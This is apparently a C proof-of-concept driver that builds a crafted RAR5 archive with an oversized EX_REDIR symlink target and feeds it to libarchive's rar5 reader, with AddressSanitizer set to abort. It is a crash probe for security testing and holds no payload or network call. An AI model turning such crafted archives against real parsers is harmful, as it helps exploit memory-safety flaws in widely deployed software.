/*
 * probe.c — PoC driver for the rar5 EX_REDIR link-target parsing path.
 *
 * Builds, in memory, a well-formed RAR5 archive holding one file entry
 * whose extra data carries an EX_REDIR (symlink) field with a long
 * target, then reads the entry header through the public libarchive
 * API.  No files are touched; everything goes through
 * archive_read_open_memory().
 */
#include <archive.h>
#include <archive_entry.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Ask the ASan runtime (when present) to die with SIGABRT on error. */
const char *__asan_default_options(void)
{
	return "abort_on_error=1";
}

/* ---- tiny helpers to serialize the archive ---- */

struct buf {
	unsigned char *p;
	size_t cap, len;
};

static void put(struct buf *b, const void *d, size_t n)
{
	if (b->len + n > b->cap) {
		b->cap = (b->len + n) * 2 + 64;
		b->p = realloc(b->p, b->cap);
		if (b->p == NULL)
			exit(2);
	}
	memcpy(b->p + b->len, d, n);
	b->len += n;
}

static void put_varint(struct buf *b, unsigned long long v)
{
	for (;;) {
		unsigned char c = v & 0x7f;
		v >>= 7;
		if (v)
			c |= 0x80;
		put(b, &c, 1);
		if (!v)
			break;
	}
}

static unsigned long crc32_tab[256];
static void crc32_init(void)
{
	for (unsigned long i = 0; i < 256; i++) {
		unsigned long c = i;
		for (int k = 0; k < 8; k++)
			c = (c & 1) ? (0xEDB88320UL ^ (c >> 1)) : (c >> 1);
		crc32_tab[i] = c;
	}
}

static unsigned long crc32_of(const unsigned char *d, size_t n)
{
	unsigned long c = 0xFFFFFFFFUL;
	for (size_t i = 0; i < n; i++)
		c = crc32_tab[(c ^ d[i]) & 0xff] ^ (c >> 8);
	return c ^ 0xFFFFFFFFUL;
}

/* RAR5 block: [crc32][size varint][type varint][flags varint][fields] */
static void put_block(struct buf *out, unsigned long type,
    unsigned long flags, const unsigned char *fields, size_t flen)
{
	struct buf body = { NULL, 0, 0 };
	struct buf hdr = { NULL, 0, 0 };
	unsigned long crc;

	put_varint(&body, type);
	put_varint(&body, flags);
	put(&body, fields, flen);

	put_varint(&hdr, body.len);
	put(&hdr, body.p, body.len);

	crc = crc32_of(hdr.p, hdr.len);
	put(out, &crc, 4);
	put(out, hdr.p, hdr.len);

	free(body.p);
	free(hdr.p);
}

int main(void)
{
	static const unsigned char sig[] = "Rar!\x1a\x07\x01\x00";
	struct buf arc = { NULL, 0, 0 };
	struct buf fields = { NULL, 0, 0 };
	struct buf extra = { NULL, 0, 0 };
	struct buf payload = { NULL, 0, 0 };
	const size_t target_size = 4096;
	unsigned char zero = 0;

	crc32_init();

	/* EX_REDIR field payload: type, flags, target_size, target bytes. */
	put_varint(&payload, 1);            /* REDIR_TYPE_UNIXSYMLINK */
	put_varint(&payload, 0);            /* redir flags */
	put_varint(&payload, target_size);  /* target length */
	for (size_t i = 0; i < target_size; i++)
		put(&payload, "L", 1);

	/* extra field: [field size][field id][payload] */
	put_varint(&extra, 1 + payload.len); /* id varint + payload */
	put_varint(&extra, 5);               /* EX_REDIR */
	put(&extra, payload.p, payload.len);

	/* file header fields */
	put_varint(&fields, extra.len);      /* extra data size */
	put_varint(&fields, 0);              /* data size (HFL_DATA) */
	put_varint(&fields, 0);              /* file flags */
	put_varint(&fields, 0);              /* unpacked size */
	put_varint(&fields, 0644);           /* attributes */
	put_varint(&fields, 0);              /* compression info: store */
	put_varint(&fields, 1);              /* host os: unix */
	put_varint(&fields, 1);              /* name size */
	put(&fields, "a", 1);
	put(&fields, extra.p, extra.len);    /* the extra data itself */

	put(&arc, sig, sizeof(sig) - 1);
	put_block(&arc, 1, 0, &zero, 1);           /* HEAD_MAIN: arch flags 0 */
	put_block(&arc, 2, 3, fields.p, fields.len); /* HEAD_FILE + extra */
	put_block(&arc, 5, 0, &zero, 0);           /* HEAD_ENDARC */

	struct archive *a = archive_read_new();
	archive_read_support_format_rar5(a);
	int r = archive_read_open_memory(a, arc.p, arc.len);
	if (r != ARCHIVE_OK) {
		fprintf(stderr, "open failed: %s\n", archive_error_string(a));
		return 1;
	}

	struct archive_entry *e;
	for (;;) {
		r = archive_read_next_header(a, &e);
		if (r == ARCHIVE_EOF)
			break;
		if (r != ARCHIVE_OK && r != ARCHIVE_WARN) {
			fprintf(stderr, "header: %s\n",
			    archive_error_string(a));
			break;
		}
		fprintf(stderr, "entry: %s\n", archive_entry_pathname(e));
	}
	archive_read_free(a);
	free(arc.p);
	free(fields.p);
	free(extra.p);
	free(payload.p);
	fprintf(stderr, "done r=%d\n", r);
	return 0;
}
